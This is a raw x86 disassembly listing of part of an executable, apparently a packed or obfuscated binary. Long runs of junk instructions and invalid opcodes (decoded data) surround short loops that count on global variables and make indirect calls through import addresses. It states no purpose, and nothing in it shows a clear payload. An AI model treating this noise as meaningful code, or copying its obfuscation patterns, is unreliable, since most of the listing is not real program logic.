  4020f8:	fsubr  QWORD PTR [ebx]
  4020fa:	std    
  4020fb:	aad    0x93
  4020fd:	lea    ebx,[edx-0x76bcbbbf]
  402103:	lahf   
  402104:	pop    es
  402105:	mov    eax,0x47a9d8f
  40210a:	adc    BYTE PTR [edx-0x734f5b03],0xb9
  402111:	push   es
  402112:	and    BYTE PTR [ecx],0x52
  402115:	(bad)  
  402116:	ins    DWORD PTR es:[edi],dx
  402117:	lods   al,BYTE PTR ds:[esi]
  402118:	add    ecx,DWORD PTR [edi]
  40211a:	shl    DWORD PTR [edi],0x27
  40211d:	mov    BYTE PTR [ebx-0x2f547468],bl
  402123:	add    eax,0xad40b34f
  402128:	cdq    
  402129:	xor    ebx,DWORD PTR [esi+0x70]
  40212c:	(bad)  
  40212d:	sub    eax,0x49b7a7cc
  402132:	mov    dl,0x7a
  402134:	cmp    al,0x3e
  402136:	pop    edi
  402137:	in     eax,0x74
  402139:	sub    eax,0xac28fe58
  40213e:	cs mov ch,0xf6
  402141:	or     BYTE PTR [esi+0x6ba655b0],ah
  402147:	xchg   ch,ah
  402149:	stos   DWORD PTR es:[edi],eax
  40214a:	int3   
  40214b:	add    al,ah
  40214d:	cli    
  40214e:	inc    ebp
  40214f:	jge    0x40216b
  402151:	jne    0x402136
  402153:	ret    0x5b10
  402156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402157:	arpl   sp,bx
  402159:	repz add BYTE PTR [ecx+ebp*8+0x50],ah
  40215e:	ret    
  40215f:	xor    eax,0xacbe4b9a
  402164:	xchg   edi,eax
  402165:	fistp  DWORD PTR [ecx+0x0]
  402168:	fisubr WORD PTR [ebx-0x691ee8f3]
  40216e:	mov    ch,0x9c
  402170:	dec    ebx
  402171:	sub    ebx,edx
  402173:	or     bh,BYTE PTR [edx]
  402175:	sub    DWORD PTR [ebp+0x75],0xae810630
  40217c:	es push 0xad5c6f58
  402182:	push   0xffffffff
  402184:	or     eax,0xab58388
  402189:	dec    edx
  40218a:	(bad)  
  40218b:	loop   0x40211e
  40218d:	adc    edi,DWORD PTR [edx-0x1b]
  402190:	retf   0x3bc
  402193:	cmp    al,0xb
  402195:	dec    eax
  402196:	(bad)  
  402197:	pop    ebp
  402198:	iret   
  402199:	mov    dh,0xf1
  40219b:	out    dx,eax
  40219c:	jmp    0xfb13:0xd3b15de
  4021a3:	inc    edi
  4021a4:	xchg   DWORD PTR [ecx+0x1b],edi
  4021a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021a8:	or     ebp,ecx
  4021aa:	aaa    
  4021ab:	test   DWORD PTR [ebp+0x49cf15cf],edx
  4021b1:	inc    ecx
  4021b2:	or     BYTE PTR [eax+0x3a],ch
  4021b5:	xchg   esp,eax
  4021b6:	in     eax,0xea
  4021b8:	mov    ebx,0x9722d7d1
  4021bd:	outs   dx,BYTE PTR ds:[esi]
  4021be:	js     0x402219
  4021c0:	aas    
  4021c1:	mov    ch,0x4f
  4021c3:	out    0x1b,eax
  4021c5:	xlat   BYTE PTR ds:[ebx]
  4021c6:	cmp    ebx,DWORD PTR [esp+ebx*1-0x1c7b9e89]
  4021cd:	aam    0x17
  4021cf:	div    ebp
  4021d1:	stos   BYTE PTR es:[edi],al
  4021d2:	add    BYTE PTR [ecx],ch
  4021d4:	enter  0x9e39,0xb1
  4021d8:	or     DWORD PTR [edi+0x1],ecx
  4021db:	dec    edi
  4021dc:	div    BYTE PTR [edi]
  4021de:	ret    0x4c52
  4021e1:	jne    0x402204
  4021e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021e5:	cmp    BYTE PTR [edx],al
  4021e7:	stos   BYTE PTR es:[edi],al
  4021e8:	lods   al,BYTE PTR ds:[esi]
  4021e9:	es pop edx
  4021eb:	fxch   st(0)
  4021ed:	or     DWORD PTR [ebp+0x10163d37],edi
  4021f3:	inc    esi
  4021f4:	sbb    al,0x2b
  4021f6:	mov    ch,0x39
  4021f8:	fwait
  4021f9:	(bad)  
  4021fa:	mov    esp,0xc02aa88
  4021ff:	jge    0x4021bc
  402201:	mov    eax,ds:0x67d566ea
  402206:	scas   eax,DWORD PTR es:[edi]
  402207:	and    BYTE PTR ds:0xf5fd54bf,0x49
  40220e:	cs mov edx,0x1ef838cd
  402214:	mov    ebp,DWORD PTR [esi-0x19e91a13]
  40221a:	cmp    BYTE PTR [esi-0x10],0x3e
  40221e:	je     0x40225b
  402220:	xor    eax,DWORD PTR [ecx]
  402222:	jmp    0x5cc13675
  402227:	inc    ecx
  402228:	mov    bh,0x39
  40222a:	stc    
  40222b:	add    al,0xe0
  40222d:	stos   DWORD PTR es:[edi],eax
  40222e:	je     0x40227c
  402230:	push   eax
  402231:	inc    ebx
  402232:	aaa    
  402233:	cwde   
  402234:	and    BYTE PTR [edx+0x15bc664b],0x8f
  40223b:	cmp    dh,BYTE PTR [ebx-0x14]
  40223e:	xlat   BYTE PTR ds:[ebx]
  40223f:	test   al,0xdc
  402241:	push   0x2a4819ed
  402246:	jbe    0x402253
  402248:	cld    
  402249:	sbb    ebp,DWORD PTR [edx-0x32]
  40224c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40224d:	into   
  40224e:	adc    esi,ebx
  402250:	dec    ebx
  402251:	pop    eax
  402252:	xchg   esi,eax
  402253:	xchg   edx,eax
  402254:	bound  ebx,QWORD PTR [edi]
  402256:	xor    dl,dh
  402258:	popf   
  402259:	adc    bl,al
  40225b:	push   ecx
  40225c:	es mov edx,0x9e6183c9
  402262:	cld    
  402263:	mov    ah,0x93
  402265:	cld    
  402266:	lods   eax,DWORD PTR ds:[esi]
  402267:	out    dx,eax
  402268:	xchg   edx,eax
  402269:	cmc    
  40226a:	pop    es
  40226b:	jnp    0x402202
  40226d:	retf   
  40226e:	or     BYTE PTR [ebp-0x53],ah
  402271:	xchg   edi,eax
  402272:	xchg   DWORD PTR [edi-0x666bcbf3],ecx
  402278:	inc    eax
  402279:	sub    ebp,DWORD PTR [ebp-0x2d]
  40227c:	cs psrad mm7,mm4
  402280:	mov    dh,0x78
  402282:	push   0x7b
  402284:	pop    ss
  402285:	fmul   QWORD PTR [ecx]
  402287:	jl     0x4022d2
  402289:	mov    eax,ds
  40228b:	stos   BYTE PTR es:[edi],al
  40228c:	aaa    
  40228d:	jmp    0x2c84:0xe0621e0c
  402294:	mov    WORD PTR [edx-0x2a],ss
  402297:	aas    
  402298:	xor    eax,0x76d86406
  40229d:	mov    esp,0x2cf22e8
  4022a2:	jnp    0x4022e9
  4022a4:	adc    ch,BYTE PTR ds:0x5ed8584a
  4022aa:	jmp    0x402265
  4022ac:	shl    cl,1
  4022ae:	fdivrp st(2),st
  4022b0:	retf   
  4022b1:	and    eax,0x48c37a17
  4022b6:	push   0x19
  4022b8:	inc    esp
  4022b9:	lods   eax,DWORD PTR ds:[esi]
  4022ba:	or     al,0xe4
  4022bc:	stos   DWORD PTR es:[edi],eax
  4022bd:	fisubr DWORD PTR [edx+0x5c]
  4022c0:	test   al,0x54
  4022c2:	mov    dh,dh
  4022c4:	sub    DWORD PTR [edx-0x5a16a713],edx
  4022ca:	sti    
  4022cb:	cmc    
  4022cc:	sub    DWORD PTR [ecx+0x4b],ecx
  4022cf:	mov    al,ds:0x767ffa9e
  4022d4:	add    eax,0x63ce2905
  4022d9:	jmp    0x4022d0
  4022db:	mov    dl,BYTE PTR ds:0x446eed7e
  4022e1:	add    DWORD PTR [esi-0x29],ecx
  4022e4:	xcrypt-cbc (bad)
  4022e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e6:	nop
  4022e7:	leave  
  4022e8:	das    
  4022e9:	pop    edx
  4022ea:	inc    ebx
  4022eb:	(bad)  [esi-0x6e0fc693]
  4022f1:	out    0x12,al
  4022f3:	dec    ebp
  4022f4:	std    
  4022f5:	fld    QWORD PTR [esi]
  4022f7:	fistp  QWORD PTR [edx]
  4022f9:	mov    eax,0x81c2d5f1
  4022fe:	mov    dl,0xeb
  402300:	cmp    ah,BYTE PTR [ecx-0x254f481]
  402306:	adc    eax,0x423066b6
  40230b:	add    al,0xa8
  40230d:	lahf   
  40230e:	hlt    
  40230f:	addr16 mov al,0x70
  402312:	dec    ebp
  402313:	lea    esp,[ebp+0x68]
  402316:	or     DWORD PTR [ebx+0x243e6b51],edx
  40231c:	aas    
  40231d:	pop    edi
  40231e:	and    bh,dh
  402320:	imul   edx,ebp,0x32d5ee70
  402326:	xor    DWORD PTR [esi-0x75],esp
  402329:	daa    
  40232a:	loopne 0x40233a
  40232c:	and    bh,0xa7
  40232f:	test   BYTE PTR [edi],bl
  402331:	shl    edx,cl
  402333:	inc    esp
  402334:	ja     0x402335
  402336:	push   eax
  402337:	ret    
  402338:	inc    esp
  402339:	je     0x4022e7
  40233b:	inc    eax
  40233c:	add    BYTE PTR [esi+0x69d61cd],0x81
  402343:	push   esi
  402344:	push   edi
  402345:	fld    QWORD PTR [esi+0x3]
  402348:	sbb    bh,ch
  40234a:	xchg   ebp,eax
  40234b:	jg     0x402333
  40234d:	sub    ebp,DWORD PTR [ecx+0xe]
  402350:	test   edx,edi
  402352:	xor    bl,BYTE PTR [ebx]
  402354:	and    eax,0x99144f45
  402359:	lea    eax,[ebp-0x98]
  40235f:	inc    ebx
  402360:	mov    DWORD PTR [ebp-0x8],eax
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433617,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4336fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43367b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43367b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43367b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43367b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43367b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4336bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4336f7
  4023d7:	or     DWORD PTR ds:0x433667,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433677,0x43373f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43366f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43366f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43366f,ecx
  40240a:	cmp    DWORD PTR ds:0x43366f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433810
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43366f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43366f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43366f,ecx
  402450:	cmp    DWORD PTR ds:0x43366f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x7caac70]
  402480:	mov    ah,0x7
  402482:	mov    edx,0x6f7e7e01
  402487:	jge    0x402507
  402489:	jle    0x4024e2
  40248b:	int3   
  40248c:	jne    0x40243a
  40248e:	dec    ebx
  40248f:	out    dx,eax
  402490:	shl    BYTE PTR [ecx+0x10],cl
  402493:	es mov ah,0xc1
  402496:	jnp    0x402477
  402498:	stc    
  402499:	mov    cl,0x9b
  40249b:	enter  0x52f4,0x67
  40249f:	cmp    edx,esp
  4024a1:	mov    bh,0x64
  4024a3:	push   es
  4024a4:	pop    edi
  4024a5:	mov    ch,0x7e
  4024a7:	jns    0x402497
  4024a9:	cmp    bh,BYTE PTR [eax]
  4024ab:	add    ecx,0x1702155e
  4024b1:	(bad)  
  4024b2:	test   DWORD PTR [ebp-0x73],0xab2186b0
  4024b9:	push   edx
  4024ba:	pusha  
  4024bb:	xlat   BYTE PTR ds:[ebx]
  4024bc:	nop
  4024bd:	call   0xfbb42033
  4024c2:	les    esi,FWORD PTR [eax-0x24]
  4024c5:	pop    ds
  4024c6:	add    DWORD PTR [ebp-0x73],eax
  4024c9:	or     eax,0x13324ef
  4024ce:	mul    ebp
  4024d0:	xchg   DWORD PTR [edi],esp
  4024d2:	mov    ebx,0x8e9d8567
  4024d7:	in     al,0xe1
  4024d9:	jnp    0x40245c
  4024db:	or     ecx,ebp
  4024dd:	pushf  
  4024de:	repnz push 0x54
  4024e1:	xlat   BYTE PTR ds:[ebx]
  4024e2:	fld    QWORD PTR [ebx]
  4024e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024e5:	adc    eax,0x7736d68a
  4024ea:	inc    ebp
  4024eb:	leave  
  4024ec:	(bad)  
  4024ed:	(bad)  [eax+0x5b6f2bab]
  4024f3:	mov    es,WORD PTR [esi]
  4024f5:	xor    edx,edx
  4024f7:	jbe    0x402527
  4024f9:	ds out dx,eax
  4024fb:	pop    ecx
  4024fc:	pop    ss
  4024fd:	inc    esp
  4024fe:	add    edx,ecx
  402500:	lods   eax,DWORD PTR ds:[esi]
  402501:	adc    DWORD PTR [eax-0x7ac5bb1f],ecx
  402507:	push   ebx
  402508:	xchg   edx,eax
  402509:	xor    esi,DWORD PTR [edi-0x6eabded1]
  40250f:	shr    DWORD PTR [ebp+0x690bea64],cl
  402515:	out    dx,al
  402516:	and    al,0xbd
  402518:	push   eax
  402519:	mov    ebx,0x2f9f1167
  40251e:	std    
  40251f:	add    al,0xac
  402521:	cmp    edx,DWORD PTR [eax]
  402523:	sti    
  402524:	leave  
  402525:	cmp    dh,BYTE PTR ds:0x7024cdd5
  40252b:	repnz outs dx,BYTE PTR ds:[esi]
  40252d:	iret   
  40252e:	and    bl,al
  402530:	add    eax,0x9c282c7b
  402535:	jge    0x40257c
  402537:	stc    
  402538:	cdq    
  402539:	push   0x74
  40253b:	lods   al,BYTE PTR ds:[esi]
  40253c:	lds    edi,FWORD PTR [ebx-0x543a28bd]
  402542:	mov    esi,DWORD PTR [edx+0x6c]
  402545:	shl    BYTE PTR [esi],1
  402547:	and    DWORD PTR [ebp+ecx*1+0x63eb028f],ebx
  40254e:	jbe    0x402593
  402550:	in     al,dx
  402551:	dec    edi
  402552:	out    0xf9,eax
  402554:	(bad)  
  402555:	outs   dx,BYTE PTR ds:[esi]
  402556:	mov    ebx,DWORD PTR [ebx+0x55]
  402559:	or     cl,BYTE PTR ds:0x44c4340b
  40255f:	sub    eax,0x2a7f15c4
  402564:	inc    ebx
  402565:	adc    BYTE PTR [ecx-0x6e3eaf32],bl
  40256b:	pop    eax
  40256c:	and    BYTE PTR [esp+ebp*2],0x2c
  402570:	arpl   dx,bp
  402572:	pushf  
  402573:	aam    0x9f
  402575:	mov    ebx,0xb040764d
  40257a:	mov    ah,0x3f
  40257c:	adc    BYTE PTR [ebp+0x1cc3943a],ah
  402582:	mov    dh,0x5c
  402584:	xchg   ecx,eax
  402585:	xchg   esi,eax
  402586:	lahf   
  402587:	push   cs
  402588:	test   cl,dl
  40258a:	mov    BYTE PTR [eax-0x5da724f1],al
  402590:	pop    ebp
  402591:	test   al,0x14
  402593:	and    al,0x2d
  402595:	dec    ebx
  402596:	cld    
  402597:	or     edi,DWORD PTR [edi+0x2f]
  40259a:	les    ecx,FWORD PTR [ebp+0x742243d1]
  4025a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025a1:	sub    bh,BYTE PTR [edi]
  4025a3:	fadd   QWORD PTR [ecx]
  4025a5:	jl     0x402574
  4025a7:	rcl    DWORD PTR [ecx-0x9],0x50
  4025ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025ac:	or     edi,DWORD PTR [ebx]
  4025ae:	xchg   esi,eax
  4025af:	adc    edi,DWORD PTR [edx+eiz*2]
  4025b2:	push   es
  4025b3:	adc    dl,BYTE PTR [ebp-0x6]
  4025b6:	aad    0x74
  4025b8:	jbe    0x402596
  4025ba:	(bad)  
  4025bb:	cld    
  4025bc:	push   eax
  4025bd:	jo     0x4025fc
  4025bf:	fsubr  QWORD PTR [ecx-0x31]
  4025c2:	dec    ebp
  4025c3:	or     eax,0xa55bb16f
  4025c8:	or     ebx,DWORD PTR [edx-0x5f]
  4025cb:	loop   0x40264c
  4025cd:	(bad)  
  4025ce:	loope  0x40257e
  4025d0:	xchg   bl,dl
  4025d2:	cmc    
  4025d3:	xor    DWORD PTR [esi+0x7db32049],eax
  4025d9:	je     0x402586
  4025db:	sbb    edx,esp
  4025dd:	add    al,0x7d
  4025df:	cld    
  4025e0:	mov    eax,ds:0xea49f159
  4025e5:	xor    DWORD PTR [ebp+ebx*4-0x10f6a4db],ebx
  4025ec:	sbb    al,0x1a
  4025ee:	neg    BYTE PTR [ebp+ecx*8+0x38]
  4025f2:	mov    bh,0x18
  4025f4:	aas    
  4025f5:	and    al,ch
  4025f7:	imul   ebp,DWORD PTR [ebp+0x58],0xffffffa5
  4025fb:	stc    
  4025fc:	(bad)  
  4025fe:	or     ecx,edi
  402600:	push   edx
  402601:	test   DWORD PTR [ecx],edi
  402603:	sub    eax,0x58984296
  402608:	push   cs
  402609:	adc    al,0xd0
  40260c:	(bad)  
  40260d:	sbb    ebx,esi
  40260f:	pop    esp
  402610:	retf   0x9c7c
  402613:	mov    eax,0xbfe700af
  402618:	cmp    al,bl
  40261a:	mov    ds:0xaa49b5c8,eax
  40261f:	mov    ebp,0x77b4d2ad
  402624:	retf   
  402625:	std    
  402626:	repz add ah,BYTE PTR [edi+eiz*2-0x61]
  40262b:	mov    BYTE PTR [edi+0x559f2af7],0xf4
  402632:	xchg   BYTE PTR [ecx-0x7ce724e1],bh
  402638:	call   0x1a3e:0xd6010e7d
  40263f:	rcr    DWORD PTR [esi+esi*4-0x4f],1
  402643:	js     0x4025fd
  402645:	xchg   ebx,eax
  402646:	imul   eax,DWORD PTR [ebp+0x45],0xffffffcd
  40264a:	in     al,0x87
  40264c:	test   esi,0x33ebcd0f
  402652:	lods   eax,DWORD PTR ds:[esi]
  402653:	das    
  402654:	push   edi
  402655:	in     al,dx
  402656:	scas   eax,DWORD PTR es:[edi]
  402657:	(bad)  
  402658:	and    ecx,DWORD PTR [edx-0x718ea3a4]
  40265e:	cmc    
  40265f:	xor    bl,BYTE PTR [edi-0x19]
  402662:	fldenv [eax-0x7]
  402665:	rol    BYTE PTR ds:0x2fcb28d0,cl
  40266b:	sub    al,0x34
  40266d:	sbb    dh,BYTE PTR [edx+0x10dada94]
  402673:	ret    0xa68a
  402676:	mov    WORD PTR es:[esi-0x16e7d41b],cs
  40267d:	cmc    
  40267e:	hlt    
  40267f:	mov    al,ds:0xaae7f7ab
  402684:	xchg   esi,eax
  402685:	push   edx
  402686:	cmp    DWORD PTR [edx-0x7b],0x6d
  40268a:	add    al,0xf7
  40268c:	popa   
  40268d:	ret    
  40268e:	out    dx,al
  40268f:	dec    ebx
  402690:	jmp    0x809b:0xd067f857
  402697:	outs   dx,DWORD PTR ds:[esi]
  402698:	mov    ecx,fs
  40269a:	outs   dx,BYTE PTR ds:[esi]
  40269b:	cmc    
  40269c:	xchg   esp,eax
  40269d:	clc    
  40269e:	dec    bl
  4026a0:	xor    eax,0x566baad7
  4026a5:	sub    al,0x1a
  4026a7:	imul   edx,DWORD PTR [eax+edx*8-0x2f],0xa
  4026ac:	sbb    BYTE PTR [ecx-0x45],bl
  4026af:	push   esi
  4026b0:	out    0x41,eax
  4026b2:	add    eax,esi
  4026b4:	fst    DWORD PTR [ecx]
  4026b6:	mov    eax,ds:0x63169f76
  4026bb:	mov    al,0xd0
  4026bd:	xor    BYTE PTR [edx+ebx*1+0xa4cf18c],cl
  4026c4:	clc    
  4026c5:	mov    eax,0x784d25a6
  4026ca:	inc    edx
  4026cb:	dec    edi
  4026cc:	push   ds
  4026cd:	(bad)  
  4026ce:	scas   al,BYTE PTR es:[edi]
  4026cf:	jae    0x40267e
  4026d1:	aaa    
  4026d2:	dec    ebx
  4026d3:	push   ss
  4026d4:	js     0x4026aa
  4026d6:	inc    esp
  4026d7:	inc    ebp
  4026d8:	fbstp  TBYTE PTR [ecx-0x25bdbd4f]
  4026de:	pop    es
  4026df:	sahf   
  4026e0:	ficom  WORD PTR [esi+0x67]
  4026e3:	push   cs
  4026e4:	ja     0x402741
  4026e6:	cmp    al,0x9b
  4026e8:	cmp    DWORD PTR [ebx-0x9b3e64d],eax
  4026ee:	out    0x3a,eax
  4026f0:	jae    0x40270f
  4026f2:	cmp    al,0xe2
  4026f4:	inc    esp
  4026f5:	or     ch,bl
  4026f7:	inc    esi
  4026f8:	sar    DWORD PTR [ebp+0x4f1b0099],0xd3
  4026ff:	or     BYTE PTR [ecx],bl
  402701:	fsub   st(7),st
  402703:	mov    eax,ds:0x93640057
  402708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402709:	sahf   
  40270a:	retf   
  40270b:	xchg   ebx,eax
  40270c:	adc    al,0xa4
  40270e:	and    DWORD PTR [edi+ebx*8+0x3edbe5ec],edx
  402715:	int    0x38
  402717:	mov    dl,0xfb
  402719:	int3   
  40271a:	mov    dh,ch
  40271c:	jg     0x40272a
  40271e:	fiadd  WORD PTR [ebx]
  402720:	nop
  402721:	inc    ebx
  402722:	fnsave [esp+esi*1+0x27]
  402726:	call   DWORD PTR [ebx]
  402728:	jmp    0xb98d6372
  40272d:	jbe    0x4026cb
  40272f:	popf   
  402730:	cmp    BYTE PTR [ebx-0x6f],cl
  402733:	in     al,0xfa
  402735:	jp     0x40279e
  402737:	inc    edi
  402738:	xchg   edi,eax
  402739:	jl     0x40278c
  40273b:	mov    bh,0xf1
  40273d:	cmp    BYTE PTR [ebp-0x2632e300],dh
  402743:	jmp    0x402752
  402745:	ja     0x402736
  402747:	sub    eax,0x9e50f598
  40274c:	jo     0x4026da
  40274e:	repz sbb cl,BYTE PTR [esi-0x5f]
  402752:	mov    BYTE PTR [ecx+edi*8+0x4f],dh
  402756:	jmp    0xdc3b:0xc2639c21
  40275d:	fadd   DWORD PTR [esi]
  40275f:	cmp    eax,0x6172a475
  402764:	inc    esp
  402765:	mov    ebp,0xde93d072
  40276a:	push   ds
  40276b:	xchg   edx,eax
  40276c:	sbb    DWORD PTR [bp+0x3c63],ebp
  402771:	mov    dl,0xa1
  402773:	add    eax,0xb00cb39a
  402778:	ss jns 0x4027f3
  40277b:	inc    edx
  40277c:	rcl    DWORD PTR [eax],1
  40277e:	ins    DWORD PTR es:[edi],dx
  40277f:	inc    esp
  402780:	imul   eax,DWORD PTR [edx],0x12d99729
  402786:	pop    eax
  402787:	gs pop esi
  402789:	mov    ah,0xc3
  40278b:	mov    ecx,0xd4ba674d
  402790:	test   BYTE PTR [ebx+0x30fc5e26],bl
  402796:	inc    eax
  402797:	push   edi
  402798:	sbb    BYTE PTR [esi],0xff
  40279b:	ins    BYTE PTR es:[edi],dx
  40279c:	call   0x55c9:0xedc6c583
  4027a3:	sub    BYTE PTR [ebp+0x2b],0x67
  4027a7:	mov    edi,0x9a6193f7
  4027ac:	xlat   BYTE PTR ds:[ebx]
  4027ad:	sbb    bl,0xa7
  4027b0:	push   edx
  4027b1:	jg     0x4027e9
  4027b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027b4:	rcr    BYTE PTR [eax],0x41
  4027b7:	cmp    eax,0x2fc08a4b
  4027bc:	and    dl,ah
  4027be:	push   ds
  4027bf:	mov    edx,0x7da59084
  4027c4:	out    0xa1,eax
  4027c6:	or     eax,0x558e0555
  4027cb:	sub    BYTE PTR [edi+0x21923ef2],bh
  4027d1:	outs   dx,BYTE PTR ds:[esi]
  4027d2:	rcr    DWORD PTR [eax-0x2f11732f],1
  4027d8:	imul   esi,DWORD PTR [edx],0x53eb2942
  4027de:	jmp    0x29958beb
  4027e3:	pusha  
  4027e4:	fmul   QWORD PTR fs:[edi]
  4027e7:	sub    eax,0xbd4806c0
  4027ec:	xlat   BYTE PTR ds:[ebx]
  4027ed:	into   
  4027ee:	push   esi
  4027ef:	or     ecx,DWORD PTR [esi+0x17]
  4027f2:	iret   
  4027f3:	sub    DWORD PTR [ecx+0x104a33a9],esp
  4027f9:	loope  0x4027a0
  4027fb:	xchg   edi,eax
  4027fc:	inc    esp
  4027fd:	cmc    
  4027fe:	fisubr WORD PTR [eax]
  402800:	(bad)  
  402801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402802:	xchg   ecx,eax
  402803:	out    0x54,eax
  402805:	mov    edx,0x6539ee
  40280a:	push   ecx
  40280b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40280c:	popa   
  40280d:	mov    cs,WORD PTR [eax-0x4e8368df]
  402813:	inc    edx
  402814:	cmc    
  402815:	mov    ds:0xd5b030a6,eax
  40281a:	inc    eax
  40281b:	or     eax,0x16e5a950
  402820:	push   ecx
  402821:	pop    ebp
  402822:	(bad)  
  402823:	into   
  402824:	cmp    DWORD PTR [esi-0x1dc14e9],edi
  40282a:	inc    esi
  40282b:	jmp    0x3fb4:0xd944ea53
  402832:	out    0xc3,al
  402834:	and    eax,DWORD PTR [edx+0x56ba2c03]
  40283a:	xlat   BYTE PTR ds:[ebx]
  40283b:	into   
  40283c:	dec    ecx
  40283d:	call   0xa87c23c6
  402842:	es mov bh,0x89
  402845:	lock lea esi,[eax]
  402848:	jb     0x4027f9
  40284a:	outs   dx,BYTE PTR ds:[esi]
  40284b:	and    ebp,ebp
  40284d:	lahf   
  40284e:	call   0xb55d:0xbc8306f9
  402855:	dec    ecx
  402856:	jle    0x4028c9
  402858:	jbe    0x40284d
  40285a:	sbb    ah,cl
  40285c:	push   edi
  40285d:	xchg   esi,eax
  40285e:	fadd   st,st(3)
  402860:	outs   dx,DWORD PTR fs:[esi]
  402862:	or     BYTE PTR [edi-0x5e605e3a],ah
  402868:	xchg   ebx,eax
  402869:	jmp    0x992dfa95
  40286e:	dec    ebp
  40286f:	aam    0x3b
  402871:	xor    eax,0xfb0c9501
  402876:	mov    bl,0xb8
  402878:	add    BYTE PTR [esi+0x84189ee],ah
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x4c8859a8]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	mov    ebx,0xaf4839d2
  4028d3:	out    dx,al
  4028d4:	dec    eax
  4028d5:	out    0xef,al
  4028d7:	xchg   ebp,eax
  4028d8:	or     al,0xad
  4028da:	in     al,dx
  4028db:	outs   dx,BYTE PTR ds:[esi]
  4028dc:	jbe    0x402907
  4028de:	mov    edx,0x945f8ec
  4028e3:	in     eax,0x38
  4028e5:	mov    WORD PTR [edx-0x3b],?
  4028e8:	fs jmp 0xcf5f92cd
  4028ee:	pop    ebp
  4028ef:	rol    DWORD PTR gs:[ebp+0x675edcc8],cl
  4028f6:	repz addr16 or eax,0x61d2f00f
  4028fd:	nop
  4028fe:	or     eax,0x48d203e7
  402903:	adc    edi,DWORD PTR [eax-0x43]
  402906:	xchg   esi,eax
  402907:	sbb    eax,0xee6ac52b
  40290c:	stos   BYTE PTR es:[edi],al
  40290d:	mov    bl,0x8e
  40290f:	or     al,0xcc
  402911:	pop    ds
  402912:	out    dx,al
  402913:	icebp  
  402914:	mov    edx,0xeadf5fd4
  402919:	call   0xfae5:0xb915ad7d
  402920:	fdivr  DWORD PTR [edi-0x9]
